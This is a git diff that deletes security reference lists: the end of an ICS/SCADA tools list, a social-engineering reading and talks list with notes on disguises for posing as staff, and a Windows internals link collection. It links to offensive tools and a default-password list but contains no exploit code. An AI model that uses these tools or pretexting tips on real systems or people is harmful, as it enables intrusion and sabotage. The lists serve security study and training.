-		* The UaExpert® is a full-featured OPC UA Client demonstrating the capabilities of our C++ OPC UA Client SDK/Toolkit. The UaExpert is designed as a general purpose test client supporting OPC UA features like DataAccess, Alarms & Conditions, Historical Access and calling of UA Methods. The UaExpert is a cross-platform OPC UA test client programmed in C++. It uses the sophisticated GUI library QT form Nokia (formerly Trolltech) forming the basic framework which is extendable by Plugins.
-	* [dyode](https://github.com/arnaudsoullie/dyode)
-		* A low-cost data diode, aimed at Industrial Control Systems
-	* [GRASSMARLIN](https://github.com/iadgov/GRASSMARLIN)
-	* [Moki Linux](https://github.com/moki-ics/moki)
-		* Moki is a modification of Kali to encorporate various ICS/SCADA Tools scattered around the internet, to create a customized Kali Linux geared towards ICS/SCADA pentesting professionals.
-* Honeypots
-	* [T-Pot](https://dtag-dev-sec.github.io/mediator/feature/2016/03/11/t-pot-16.03.html)
-		* T-Pot 16.03 - Enhanced Multi-Honeypot Platform
-	* [Conpot](https://github.com/mushorg/conpot)
-		* Conpot is an ICS honeypot with the goal to collect intelligence about the motives and methods of adversaries targeting industrial control systems
-Passwords
-	* [SCADAPASS](https://github.com/scadastrangelove/SCADAPASS)
-		* SCADA StrangeLove Default/Hardcoded Passwords List 
-* Simulation Software
-	* [MiniCPS](https://github.com/scy-phy/minicps)
-		* MiniCPS is a framework for Cyber-Physical Systems real-time simulation. It includes support for physical process and control devices simulation, and network emulation. It is build on top of mininet.
-	* [Simulated Physics And Embedded Virtualization Integration (SPAEVI) - Overview](http://www.spaevi.org/p/the-simulated-physics-and-embedded.html)
-* Testing Tools
-	* [smod - MODBUS Penetration Testing Framework](https://github.com/enddo/smod)
-		* smod is a modular framework with every kind of diagnostic and offensive feature you could need in order to pentest modbus protocol. It is a full Modbus protocol implementation using Python and Scapy. This software could be run on Linux/OSX under python 2.7.x.
-	* [SCADA Shutdown Tool](https://github.com/0xICF/SCADAShutdownTool)
-		* SCADAShutdownTool is an industrial control system automation and testing tool allows security researchers and experts to test SCADA security systems, enumerate slave controllers, read controller's registers values and rewrite registers data. SCADAShutdownTool allow enumeration of all registers types of a controller include coil outputs, digital inputs, analogue inputs, holding registers and extended registers.
-	* [Redpoint](https://github.com/digitalbond/Redpoint)
-	* Digital Bond's ICS Enumeration Tools
-* Testing
-	* [ICS Security Assessment Methodology, Tools & Tips](https://www.youtube.com/watch?v=0WoA9SYLDoM)
-		* Dale Peterson of Digital Bond describes how to perform an ICS / SCADA cyber security assessment in this S4xJapan video.  He goes into a lot of detail on the tools and how to use them in the fragile and insecure by design environment that is an ICS.  There are also useful tips on when to bother applying security patches (this will likely surprise you), the importance of identifying the impact of a vulnerability, and an efficient risk reduction approach.
-
diff --git a/Draft/Social Engineering.md b/Draft/Social Engineering.md
deleted file mode 100755
index ac54521..0000000
--- a/Draft/Social Engineering.md	
+++ /dev/null
@@ -1,158 +0,0 @@
-
-
-## Social Engineering
-
-##### TOC
-
-* [Articles](#articles)
-* [Books](#books)
-* [Presentations](#talks)
-* [Papers](#papers)
-* [Tools](#tools)
-
-
-
-
-#### sort
-
-
-http://www.ncbi.nlm.nih.gov/pmc/articles/PMC3152826/
-
-#### end sort
-
-
-------------------------
-### <a name="articles">Articles
-Articles
-* [Source Handling](http://guerrillamerica.com/2014/01/source-handling-part-one/)
-* [Source Recruitment](http://guerrillamerica.com/2013/12/source-recruitment/)
-* [List of the 48 Laws of Power](http://cgt411.tech.purdue.edu/covey/48_laws_of_power.htm)
-* [Influence: Book notes](http://www.2uo.de/influence/)
-* [DiSC Overview](https://www.discprofile.com/what-is-disc/overview/)
-	* DiSC is a personal assessment tool used to improve work productivity, teamwork and communication. DiSC is non-judgmental and helps people discuss their behavioral differences.
-* [The Social Engineering Framework](http://www.social-engineer.org/framework/general-discussion/)
-	* The Social Engineering Framework is a searchable information resource for people wishing to learn more about the psychological, physical and historical aspects of social engineering. 
-* [Phishing Family Tree Now: A Social Engineering Odyssey](https://www.blackhillsinfosec.com/?p=5629)
-
-
-
-
-----------------------
-### <a name="books">Books</a>
-Books
-* [Toastmaster's guide to body language](http://westsidetoastmasters.com/resources/book_of_body_language/toc.html)
-* Miss Manners Guide to Excellent Manners
-* [Influence: Science and Practice](https://en.wikipedia.org/wiki/Influence:_Science_and_Practice)
-* Art of Deception
-* Social Engineering: Art of Human Hacking
-* Anything by Paul Eckman and his research
-* What Every Body is saying
-* Art of the Steal
-* Craft of Intelligence
-* How to Win Friends and Influence People
-* Thank You For Arguing, Revised and Updated Edition: What Aristotle, Lincoln, And Homer Simpson Can Teach Us About the Art of Persuasion
-* [The Amy Vanderbilt Complete Book of Etiquette](https://www.archive.org/stream/amyvanderbiltsco00vandrich/amyvanderbiltsco00vandrich_djvu.txt)
-* Propaganda by Edward Bernays
-* Art of War by Sun Tzu
-* Language Intelligence: Lessons on persuasion from Jesus, Shakespeare, Lincoln, and Lady Gaga
-* The Prince by Machiavelli
-* The Definitive Book of Body Language - Barbara pease
-* 48 Laws of Power
-* Thinking Fast and Slow
-* Unmasking the Social Engineer: The Human Element of Security
-* Emotions Revealed, Second Edition: Recognizing Faces and Feelings to Improve Communication and Emotional Life
-* Influence Without Authority
-
-
---------------------
-### <a name="talks">Presentations</a>:
-Talks & Presentations
-* [Total Fail: and Bad Mistakes, I've Made a Few- Jayson Street -DEF CON 24 SE Village](https://www.youtube.com/watch?v=l1OFH_H8PjQ)
-* [Social Engineering Like In Movies -- Reality of awareness and manipulation - Dale Pearson- #days](https://www.youtube.com/watch?v=XUIWi5p0oFI)
-* [Manipulating Human Minds: The Psychological Side of Social Engineering - Christina Camilleri - CrikeyCon](https://www.youtube.com/watch?v=8enkIWl79_4)
-* [Psychological Tricks of the Social Engineer - William Tarkington - GrrCON2012](https://www.youtube.com/watch?v=bk-TK4MPs8s&index=10&list=PL_At9BlHdC-_764ciDVexbJL0hwsCzqLK)
-	* While several Social Engineering talks and books focus on the techniques no one clearly explains why they work. Learn why the techniques are used and what impact they have on behavior. Discover aspects of human social interaction that can be leveraged to accomplish discrete and specific goals. Gain a firm understanding of the limitations of humans objective reasoning. Finally understand the social rules that are used to navigate within the social engineering construct.
-* [Social Engineering: The Good, the Bad, and the Ugly -- Stephanie Carruthers ](https://www.youtube.com/watch?v=9wCrUOYQlCI&index=31&list=PL_At9BlHdC-_764ciDVexbJL0hwsCzqLK)
-* [Deceiving the heavens to cross the sea - Jayson E Street - Defcon18](https://www.youtube.com/watch?v=EzGwO5L9oq4&feature=player_embedded)
-* [How I met your girlfriend - Samy Kamkar - Defcon18](https://www.youtube.com/watch?v=YDW7kobM6Ik)
-* [Steal Everything, Kill Everyone, Cause Total Financial Ruin!](https://www.youtube.com/watch?v=JsVtHqICeKE)
-	* This is not a presentation where I talk about how I would get in or the things I might be able to do. This is a talk where I am already in and I show you pictures from actual engagements that I have been on. They say one picture is worth a thousand words I show you how one picture cost a company a million dollars and maybe even a few lives. In a community where we focus so much on the offensive I also make sure with every attack I highlight. I spend time discussing what would have stopped me. We need to know the problems but we need more talks providing solutions and that is what I hope people will get from this. I show the dangers of Social engineering and how even an employee with no SE experience can be an eBay James Bond which can cause total financial ruin to a company. These Security threats are real. So are these stories! 
-* [For The Win Tools Techniques to Maximize Effectiveness of Your Social Engineering Attacks - Joe Gray](https://www.youtube.com/watch?v=Jh9Kl4JAdEA)
-* [PG01 Dropping hell0days Business Interaction for Security Professionals Or Anyone Else Elliot Johnso ](https://www.youtube.com/watch?v=COyN3NwY1v0)
-* [Social Engineering: The Gentleman Thief  - Apollo Robins - Defcon21](https://www.youtube.com/watch?v=1kkOKvPrdZ4)
-* [Go With the Flow Strategies for Successful Social Engineering - Chris Silvers](https://www.youtube.com/watch?v=Lfm1mBrcuhY&feature=player_embedded)
-* [The Dirty South - David Kennedy and Nick Hitchcock  - Defcon21](https://www.youtube.com/watch?v=dJbm8Eh-880&index=22&list=PLMcNSdhdNcP1RZDn1GtTETHtAN3I6-M-r)
-	* It seems that every day there's a new NextGen firewall, whitelisting and blacklisting, DLP, or the latest technology thats suppose to stop us. But does it really stop "hackers"? Truth is, naw not really. In this talk we'll be showing off the latest bypass techniques for the "latest" hacker stoppers, using a universally whitelisted website as our middle man for a command and control, social engineering our way into some of the toughest companies, and showing off some techniques that work for us. This talk is about throwing misconceptions of protection and safety out the window, and going back the dirty south. Where thinking outside of the box is a requirement. We'll be releasing two new tools, one that makes meterpreter invisible over the network, and the other a shell that uses a popular third party as the command and control. A vulnerability scanner won't help you herrrrrrre.
-* [No-Tech Hacking - Hacking without a Computer - Johnny Long](https://www.youtube.com/watch?v=N4kfsxF8Tio)
-* [The Science of Social Engineering: NLP, Hypnosis and the science of persuasion-Defcon15](https://www.youtube.com/watch?v=vk-IrvrC2fo)
-* [Beyond Social Engineering: Tools for Reinventing Yourself - Defcon14](https://www.youtube.com/watch?v=S-FPJ6lpRYU)
-	* Managing multiple modular identities is not a trivial task. But that's what the technologies and politics of Now demand. These tools will enable you to create personas at a deep level, then link them into a seamless life. 	
-* [Pwning People Personally - Josh Schwartz](https://www.youtube.com/watch?v=T2Ha-ZLZTz0)
-* [Area41 2016: Dominique-Cédric Brack: Professional Social Engineering](https://youtu.be/NcpmhsSVzuM)
-* [Social Engineering: When the Phone is More Dangerous than Malware](https://www.youtube.com/watch?v=fui9AVpp1wo)
-	* Is social engineering (SE) the most dangerous security threat to your business? The Social-Engineer team will analyze current trends in social engineering through the official (and unofficial) results from the DefCon 21 Social Engineering Capture the Flag event. They will reveal how these attacks work, the latest social engineering research and how to use this information to protect organizations.
-* [What Your Body Tells Me - Body Language for the SE](https://media.defcon.org/DEF%20CON%2022/DEF%20CON%2022%20video%20and%20slides/DEF%20CON%2022%20Hacking%20Conference%20Presentation%20By%20Chris%20Hadnagy%20-%20What%20Your%20Body%20Tells%20Me%20-%20Body%20Language%20for%20the%20SE%20-%20Video%20and%20Slides.m4v)
-* [Manipulating Human Minds: The Psychological Side of Social Engineering - Christina Camilleri - CrikeyCon](https://www.youtube.com/watch?v=8enkIWl79_4)
-* [Social Engineering Like In Movies -- Reality of awareness and manipulation - Dale Pearson](https://www.youtube.com/watch?v=XUIWi5p0oFI)
-* [How do you Feel about your Mother? Psych and The SE - Michele Fincher](https://www.youtube.com/watch?v=A0_NL1YBvK4)
-* [DEF CON 11 Hacking Conference Presentation By Panel - Social Engineering Fundamentals](https://www.youtube.com/watch?v=Pcrmpevn5K0&index=12&list=PLMcNSdhdNcP1RZDn1GtTETHtAN3I6-M-r)
- * [Social Engineering Defense Contractors on LinkedIn and Facebook ](https://www.youtube.com/watch?v=L5qETnAKe7A&index=24&list=PLMcNSdhdNcP1RZDn1GtTETHtAN3I6-M-r)
-* [Social Engineering, or "hacking people" - DefCamp 2014](https://www.youtube.com/watch?v=JAOTRgWdPTU&index=49&list=PL_At9BlHdC-_764ciDVexbJL0hwsCzqLK)
-* [The Future of Social Engineering - Sharon Conheady - DeepSec2010](https://www.youtube.com/watch?v=aVIq9mdVHlc&index=11&list=PL_At9BlHdC-_764ciDVexbJL0hwsCzqLK)
-	* Social engineering is hitting the headlines more than ever. As computer security becomes more sophisticated, hackers are combining their technical expertise with social engineering to gain access to IT infrastructures and critical information. In any security programme people are the weakest link. It can often be easier and quicker to target the end user than using technical hacking techniques. When you combine both social engineering and traditional hacking techniques, you have an extremely dangerous attack. So what's next on the social engineering agenda? What are the emerging trends and what social engineering techniques might we expect to see in the future? In this talk, I will give an overview of the types of social engineering attacks people have used throughout the ages, from tricks used by the classic conmen of the past to the phishing attacks that are at an all time high, and the proliferation of social networking and how useful this is to social engineers. I will describe some of the new social engineering techniques and trends that are emerging and discuss war stories from my experience of social engineering, describing techniques I have used to gain access to sensitive information
-* [BSidesSF 2016 - The Art of the Jedi Mind Trick (Jeff Man) ](https://www.youtube.com/watch?v=3L5_Kaps5t4)
-* [Pwning People Personally](http://www.irongeek.com/i.php?page=videos/derbycon5/break-me08-pwning-people-personally-josh-schwartz)
-* [Security Guards LOL Brent White Tim Roberts - Nolacon2017](https://www.youtube.com/watch?v=yIQ-7ZSwrYw)
-* [Jedi Mind Tricks: People Skills for Security Pros - Alex DiPerma - 2017 ANYCON](http://www.irongeek.com/i.php?page=videos/anycon2017/104-jedi-mind-tricks-people-skills-for-security-pros-alex-diperna)
-	* People skills for security professionals but WAY MORE FUN!
-* [PG12 Classic Misdirection Social Engineering to Counter Surveillance Peter Clemenko III](https://www.youtube.com/watch?v=AysOwnSUmgg)
-* [Patching the Human Vulns  - Leonard Isham](http://www.irongeek.com/i.php?page=videos/derbycon4/t300-patching-the-human-vulns-leonard-isham)
-	* You are a hacker, you learn, you play, and you break. The very nature of a hacker is to question what is given to us and to play with the rules. However, most of us do not apply this methodology in all parts of our lives. Many take what is given to us about mood and health as fact and what are the results...overweight, depression, anxiety, and self esteem issues. In this presentation, we will show 2 hackers and their journey on how they addressed the issues mentioned above. Len and Moey followed two separate paths to losing over a combined 150 lbs, gaining confidence, and changing their outlook. The talk will not only cover the touchy feely portion of how to deal with weight, mood,and self esteem but will also be supported by the science behind diets, supplements and perspective. The talk will provide what worked for two hackers. YMMV. 
-* [Cheat Codez: Level UP Your SE Game - Eric Smith (@InfoSecMafia)](http://www.irongeek.com/i.php?page=videos/derbycon3/1206-cheat-codez-level-up-your-se-game-eric-smith)
-	* Everyone knows what phishing is. Everyone realizes Java applets lead to massive storms of shells. Everyone accepts tailgating is the easiest way into your building. Everyone knows smoking (areas) are bad for you AND your business. Admit it, you paid for that EXACT assessment last year. I could write your report for you without even doing the job. So what’s the problem you ask? That’s EXACTLY the problem, I say. So how do we fix these issues that plague our industry and misalign business expectations? This talk will discuss the value of Social Engineering exercises when conducted with realistic goals yielding actionable results. Of course, that means putting in REAL work throughout the engagement, not “point, click, report, rinse and repeat”. We’ll discuss tips, techniques and secrets that the PROS don’t always blog about. *PRO TIP* – This won’t be a talk on how to use a particular framework or release of a tool (there are plenty of those already). So bring your work boots, it’s time to get dirty and UP your game.
-* ["Humans, right?" Soft Skills in Security - Ariel Robinson](http://www.irongeek.com/i.php?page=videos/bsidesnova2017/200-humans-right-soft-skills-in-security-ariel-robinson)
-	* Let's face it: humans ruin everything. They are almost always the weak link in the information security chain, between their susceptibility to social engineering, rejection of security threats, and sheer laziness. You can make the best security tool in the business, but if a human doesn't use it right, well, you might as well leave your passwords on a sticky note on your-- wait a minute. Yes, humans suck at information security. But we don't make it easy. Infosec is incredibly inaccessible to your average user. Just ask me: I am one. We can't change humans (or get rid of them, no matter how much we might want to), but we can change information security. We can leverage insights from non-technical disciplines such as cognitive science, human-centered design, strategic communications, and psychology. Or we can keep hitting our heads against our desktops. As a professional communicator and bridge builder, help me help you. To make security work, we have to make it easy. For humans.
-* [**I Will Kill You** - Chris Rock(Defcon23)](https://www.youtube.com/watch?v=9FdHq3WfJg)
-* [Total Fail: and Bad Mistakes, I've Made a Few- Jayson Street -DEF CON 24 SE Village](https://www.youtube.com/watch?v=l1OFH_H8PjQ)
-
-Disguize - Appearance Hacking
-[Disguise - Appearance Hacking](http://www.irongeek.com/i.php?page=videos/derbycon2/valerie-thomas-appearance-hacking-101-the-art-of-everyday-camouflage)
-* [Transcript](http://www.ted.com/talks/amy_cuddy_your_body_language_shapes_who_you_are/transcript)
-* My notes from it: 
-* Why use makeup?
-  *    Blend into crowd
-    *  Pose as employee/vendor
-    *  Regain access if caught
-* Create distraction for teammates
-* Whom to disguise as?
-  *    Technician
-    *  Sales Executive
-* Goodwill
- *     Employee
-  *    Interview Candidate
-* Easy to see goings on
- *     Pedestrian
-  *    Sidewalk Sleeper
-* Transform into another person:
- *     Can take minutes/hours
-   *   Examine each physical attribute
-* Some modified easier than others
-  *    Entire appearance makes the difference. One part is off, whole cover can be blown
-* If using hardhat, make sure to beat the shit out of it. Add stickers. 
-
-
-
-
------------------------------
-### <a name="papers">Research Papers</a>
-Papers
-* [Construal-Level Theory of Psychological Distance](http://www.ncbi.nlm.nih.gov/pmc/articles/PMC3152826/)
-	* Abstract: People are capable of thinking about the future, the past, remote locations, another person’s perspective, and counterfactual alternatives. Without denying the uniqueness of each process, it is proposed that they constitute different forms of traversing psychological distance. Psychological distance is egocentric: Its reference point is the self in the here and now, and the different ways in which an object might be removed from that point—in time, in space, in social distance, and in hypotheticality—constitute different distance dimensions. Transcending the self in the here and now entails mental construal, and the farther removed an object is from direct experience, the higher (more abstract) the level of construal of that object. Supporting this analysis, research shows (a) that the various distances are cognitively related to each other, (b) that they similarly influence and are influenced by level of mental construal, and (c) that they similarly affect prediction, preference, and action.
-* [The Neural Basis of Decision-Making During Sensemaking: Implications for Human-System Interaction](https://www.researchgate.net/publication/278679336_The_Neural_Basis_of_Decision-Making_During_Sensemaking_Implications_for_Human-System_Interaction)
-
-
---------------------------------
-### <a name="tools"></a>Tools
-
-
-* [Step7 Open Source Ethernet Communication Suite](http://snap7.sourceforge.net/)
\ No newline at end of file
diff --git a/Draft/System Internals Windows and Linux Internals Reference.md b/Draft/System Internals Windows and Linux Internals Reference.md
deleted file mode 100755
index ae2af37..0000000
--- a/Draft/System Internals Windows and Linux Internals Reference.md	
+++ /dev/null
@@ -1,418 +0,0 @@
-## System Internals of Windows; OS X; Linux; ARM
-
-### TOC
-
-* [General Internals](#general)
-* [Windows Internals](#winternals)
-* Windows 
-* [Kerberos / Related](#kerberos)
-* [Linux Internals](#linux)
-* [Windows Reference](#windowsref)
-* [Linux Reference](#linuxref)
-* [OS X Reference](#osx)
-* [ARM Reference](#ARM)
-
-
-
-##### To Do:
-* Fix ToC so its accurate
-*	Split sections into reference material and writeup material(quick vs long reference)
-* Further categorize sections (network vs memory vs exploit mitigations vs feature)
-
-
-#### Sort
-[Elevate through ShellExecute - msdn](https://blogs.msdn.microsoft.com/vistacompatteam/2006/09/25/elevate-through-shellexecute/)
-[Waitfor - tehcnet](https://technet.microsoft.com/en-us/library/cc731613(v=ws.11).aspx?t=1&cn=ZmxleGlibGVfcmVjcw%3D%3D&iid=22f4306f9238443891cea105281cfd3f&uid=150127534&nid=244+289476616)
-[Authentication Registry Keys - msdn](https://msdn.microsoft.com/en-us/library/windows/desktop/aa374737(v=vs.85).aspx)
-	* When it installs a network provider, your application should create the registry keys and values described in this topic. These keys and values provide information to the MPR about the network providers installed on the system. The MPR checks these keys when it starts and loads the network provider DLLs that it finds.
-[](http://archive.msdn.microsoft.com/ShellRevealed/Release/ProjectReleases.aspx?ReleaseId=2871)
-[BCDEdit /dbgsettings - msdn](https://msdn.microsoft.com/en-us/library/windows/hardware/ff542187(v=vs.85).aspx)
-#### End Sort
-
-
----------------------
-## <a name="general">General Internals</a>
-* [C Function Call Conventions and the Stack](https://archive.is/o2nD5)
-* [The Anatomy of an Executable](https://github.com/mewrev/dissection)
-* [What a C programmer should know about memory](http://marek.vavrusa.com/c/memory/2015/02/20/memory/)
-* [Linux kernel development(walkthrough)](https://github.com/0xAX/linux-insides/blob/master/Misc/contribute.md)
-* [Event log explanations for various systems(not just windows)](http://eventopedia.cloudapp.net/Events/?/Operating+System)
-* [duartes.org - internals](http://duartes.org/gustavo/blog/category/internals/)
-* [The little book about OS development](https://littleosbook.github.io/)
-* [How to Make a Computer Operating System in C++](https://github.com/SamyPesse/How-to-Make-a-Computer-Operating-System)
-
----------------------
-## <a name="winref">Windows Reference</a>
-
-### <a name="Winternals">Windows Internals</a>
-Windows Internals
-* [theForger's Win32 API Programming Tutorial](http://www.winprog.org/tutorial/)
-* [x86 Disassembly/Windows Executable Files - WikiBooks](https://en.wikibooks.org/wiki/X86_Disassembly/Windows_Executable_Files)
-* [WinAPIs for Hackers](https://www.bnxnet.com/wp-content/uploads/2015/01/WinAPIs_for_hackers.pdf)
-* [About Atom Tables](https://msdn.microsoft.com/en-us/library/windows/desktop/ms649053(v=vs.85).aspx)
-* [GlobalGetAtomName function](https://msdn.microsoft.com/en-us/library/windows/desktop/ms649063(v=vs.85).aspx)
-* [windows-operating-system-archaeology](https://github.com/subTee/windows-operating-system-archaeology)
-	* subTee stuff
-* [BATTLE OF SKM AND IUM - How Windows 10 rewrites OS Architecture - Alex Ionescu](http://www.alex-ionescu.com/blackhat2015.pdf)
-* [RtlEncryptMemory function](https://msdn.microsoft.com/en-us/library/windows/desktop/aa387693(v=vs.85).aspx)
-* [RtlDecryptMemory function](https://msdn.microsoft.com/en-us/library/windows/desktop/aa387692(v=vs.85).aspx)
-
-
-
----------------------
-#### Access Control
-Access Control
-* [Mandatory Integrity Control](https://msdn.microsoft.com/en-gb/library/windows/desktop/bb648648(v=vs.85).aspx)
-* [Windows Access Control Demystified](http://citeseerx.ist.psu.edu/viewdoc/download;jsessionid=E1A09F166B29C17D2CD38C70A02576E4?doi=10.1.1.88.1930&rep=rep1&type=pdf)
-
----------------------
-##### App Containers
-App Containers
-* [Demystifying AppContainers in Windows 8 (Part I)](https://blog.nextxpert.com/2013/01/31/demystifying-appcontainers-in-windows-8-part-i/)
-* [AppContainer Isolation](https://msdn.microsoft.com/en-us/library/windows/desktop/mt595898(v=vs.85).aspx)
-
-
--------------
-#### Credential Provider
-Credential Provider
-* [Credential Providers in Windows 10 - msdn](https://msdn.microsoft.com/en-us/library/windows/desktop/mt158211(v=vs.85).aspx)
-* [ICredentialProvider interface - msdn](https://msdn.microsoft.com/en-us/library/bb776042(v=vs.85).aspx)
-	* Exposes methods used in the setup and manipulation of a credential provider. All credential providers must implement this interface.
-* [Windows Interactive Logon Architecture - technet](https://technet.microsoft.com/en-us/library/ff404303(v=ws.10))
-* [Winlogon and Credential Providers](https://msdn.microsoft.com/en-us/library/windows/desktop/bb648647(v=vs.85).aspx)
-	* Winlogon is the Windows module that performs interactive logon for a logon session. Winlogon behavior can be customized by implementing and registering a Credential Provider.
-* [Registering Network Providers and Credential Managers - msdn](https://msdn.microsoft.com/en-us/library/windows/desktop/aa379389(v=vs.85).aspx)
-* [V2 Credential Provider Sample - code.msdn](https://code.msdn.microsoft.com/windowsapps/V2-Credential-Provider-7549a730)
-	* Demonstrates how to build a v2 credential provider that makes use of the new capabilities introduced to credential provider framework in Windows 8 and Windows 8.1.
-* [Custom Credential Provider for Password Reset - blogs.technet](https://blogs.technet.microsoft.com/aho/2009/11/14/custom-credential-provider-for-password-reset/)
-* [Starting to build your own Credential Provider](https://blogs.msmvps.com/alunj/2011/02/21/starting-to-build-your-own-credential-provider/)
-	* If you’re starting to work on a Credential Provider (CredProv or CP, for short) for Windows Vista, Windows Server 2008, Windows Server 2008 R2 or Windows 7, there are a few steps I would strongly recommend you take, because it will make life easier for you.
-
-
-
----------------------
-#### Documentation
-* [AppInit_DLLs in Windows 7 and Windows Server 2008 R2](https://msdn.microsoft.com/en-us/library/windows/desktop/dd744762(v=vs.85).aspx)
-* [Antimalware Scan Interface Reference](https://msdn.microsoft.com/en-us/library/windows/desktop/dn889588(v=vs.85).aspx)
-* [Minimal COM object registration](https://blogs.msdn.microsoft.com/larryosterman/2006/01/05/minimal-com-object-registration/)
-* [Windows Data Protection](https://msdn.microsoft.com/en-us/library/ms995355.aspx)
-* [The Component Object Model](https://msdn.microsoft.com/library/ms694363.aspx)
-
-
-
----------------------
-##### Emojis/Fonts/Encoding
-* [Introducing Character Sets and Encodings - W3C](https://www.w3.org/International/getting-started/characters)
-* [An Introduction to Writing Systems & Unicode](https://r12a.github.io/scripts/tutorial/)
-* [Tifinagh - Wikipedia](https://en.m.wikipedia.org/wiki/Tifinagh)
-* [Core Text - apple](https://developer.apple.com/documentation/coretext)
-* [Full Emoji List - Unicode.org](https://unicode.org/emoji/charts/full-emoji-list.html)
-* [List of XML and HTML character entity references - Wikipedia](https://en.m.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references)
-* [Ambiguous ampersands](https://mathiasbynens.be/notes/ambiguous-ampersands)
-* [Everything You Need To Know About Emoji ??](https://www.smashingmagazine.com/2016/11/character-sets-encoding-emoji/)
-* [Emoji and Pictographs - FAQ - unicode.org](https://unicode.org/faq/emoji_dingbats.html)
-* [Unicode® Emoji](https://www.unicode.org/emoji/)
-	* This page provides information about Unicode emoji and their development. 
-* [Emojipedia](https://emojipedia.org/)
-	* Emoji Meanings
-
-
----------------------
-##### Exchange Web Services
-* [Start using web services in Exchange - msdn 2017](https://msdn.microsoft.com/en-us/library/office/jj900168(v=exchg.150).aspx)
-* [Exchange Web Services Overview - TechEd](https://www.youtube.com/watch?v=wOQMJhrp6GQ)
-
----------------------
-##### Exploit Mitigations
-* [Compiler Security Checks In Depth - MSDN Library](https://msdn.microsoft.com/library/aa290051.aspx)
-* [A Crash Course on the Depths of Win32™ Structured Exception Handling](https://www.microsoft.com/msj/0197/exception/exception.aspx)
-* [Antimalware Scan Interface Reference](https://msdn.microsoft.com/en-us/library/windows/desktop/dn889588)
-	* prevents certain kinds of powershell attacks
-* [Compiler Security Checks In Depth - MSDN Library](https://msdn.microsoft.com/library/aa290051.aspx)
-
-
----------------------
-##### HTML Applications
-[HTML Applications - msdn](https://msdn.microsoft.com/en-us/library/ms536471(VS.85).aspx)
-	* HTML Applications (HTAs) are full-fledged applications. These applications are trusted and display only the menus, icons, toolbars, and title information that the Web developer creates. In short, HTAs pack all the power of Windows Internet Explorer—its object model, performance, rendering power, protocol support, and channel–download technology—without enforcing the strict security model and user interface of the browser. HTAs can be created using the HTML and Dynamic HTML (DHTML) that you already know.
-
----------------------
-##### Memory
-* [Pushing the Limits of Windows: Virtual Memory](http://blogs.technet.com/b/markrussinovich/archive/2008/11/17/3155406.aspx)
-* [Memory Translation and Segmentation](http://duartes.org/gustavo/blog/post/memory-translation-and-segmentation/)
-* [Exploring Windows virtual memory management](http://www.triplefault.io/2017/08/exploring-windows-virtual-memory.html)
-
-
-
-
----------------------
-##### Networking
-* [WinHTTP](https://msdn.microsoft.com/en-us/library/windows/desktop/aa382925%28v=vs.85%29.aspx)
-* [WinINet](https://msdn.microsoft.com/en-us/library/windows/desktop/aa383630%28v=vs.85%29.aspx)
-* [WinINet vs WinHTTP](https://msdn.microsoft.com/en-us/library/windows/desktop/hh227298%28v=vs.85%29.aspx)
-
-
-
-
-
----------------------
-##### PE32/Processes/Threads/etc
-* [About Processes and Threads](https://msdn.microsoft.com/en-us/library/windows/desktop/ms681917%28v=vs.85%29.aspx)
-* [PE File Format Graphs](http://blog.dkbza.org/2012/08/pe-file-format-graphs.html?view=mosaic)
-* [Peering Inside the PE: A Tour of the Win32 Portable Executable File Format](https://msdn.microsoft.com/en-us/library/ms809762.aspx?utm_content=buffer4588c&utm_medium=social&utm_source=twitter.com&utm_campaign=buffer)
-* [TechNet Library: About Processes and Threads](https://msdn.microsoft.com/en-us/library/windows/desktop/ms681917%28v=vs.85%29.aspx)
-* [A Crash Course on the Depths of Win32™ Structured Exception Handling](https://www.microsoft.com/msj/0197/exception/exception.aspx)
-* [What is a DLL?](https://support.microsoft.com/en-us/help/815065/what-is-a-dll)
-	* This article describes what a dynamic link library (DLL) is and the various issues that may occur when you use DLLs.  Then, this article describes some advanced issues that you should consider when you develop your own DLLs. In describing what a DLL is, this article describes dynamic linking methods, DLL dependencies, DLL entry points, exporting DLL functions, and DLL troubleshooting tools.
-* [Run-Time Dynamic Linking](https://msdn.microsoft.com/en-us/library/ms685090.aspx)
-* [Thread Local Storage](https://msdn.microsoft.com/en-us/library/ms686749.aspx)
-* [Windows 8 BOot](http://technet.microsoft.com/en-US/windows/dn168167.aspx)
-* [PEB32 and PEB64 in one definition](http://blog.rewolf.pl/blog/?p=294)
-* [Evolution of Process Environment Block (PEB)](http://blog.rewolf.pl/blog/?p=573)
-* [VirtualAlloc function](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx)
-* [Processes, Threads, and Jobs in the Windows Operating System](https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&seqNum=2)
-
-
-
-
----------------------
-##### Registry
-* [What registry entries are needed to register a COM object.](https://blogs.msdn.microsoft.com/larryosterman/2006/01/11/what-registry-entries-are-needed-to-register-a-com-object/)
-
-
-
-
-
---------------
-### Symbol Files
-* [Process Security and Access Rights - msdn](https://msdn.microsoft.com/en-us/library/windows/desktop/ms684880%28v=vs.85%29.aspx)
-* [OpenProcessToken function - msdn](https://msdn.microsoft.com/en-us/library/windows/desktop/aa379295%28v=vs.85%29.aspx)
-* [Symbols and Symbol Files - docs ms](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/symbols-and-symbol-files)
-* [Symbol Files - docs ms](https://msdn.microsoft.com/en-us/library/windows/desktop/aa363368(v=vs.85).aspx)
-* [microsoft-pdb](https://github.com/Microsoft/microsoft-pdb)
-	* This repo contains information from Microsoft about the PDB (Program Database) Symbol File format.
-* [Public and Private Symbols - docs ms](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/public-and-private-symbols)
-* [How to Inspect the Content of a Program Database (PDB) File](https://www.codeproject.com/Articles/37456/How-To-Inspect-the-Content-of-a-Program-Database-P)
-* [microsoft-pdb](https://github.com/Microsoft/microsoft-pdb)
-	* This repo contains information from Microsoft about the PDB (Program Database) Symbol File format.
-* [Symbol Files](https://msdn.microsoft.com/en-us/library/windows/desktop/aa363368(v=vs.85).aspx)
-	* Normally, debugging information is stored in a symbol file separate from the executable. The implementation of this debugging information has changed over the years, and the following documentation will provide guidance regarding these various implementations .
-
-
-
-Syscalls
-* [windows-syscall-table](https://github.com/tinysec/windows-syscall-table)
-	* windows syscall table from xp ~ 10 rs2
-* [Debugging Functions - msdn](https://msdn.microsoft.com/en-us/library/windows/desktop/ms679303.aspx)
-* [Authenticode - MSDN](https://msdn.microsoft.com/en-us/library/ms537359(v=vs.85).aspx)
-	* Microsoft Authenticode, which is based on industry standards, allows developers to include information about themselves and their code with their programs through the use of digital signatures. 
-
-
-
----------------------
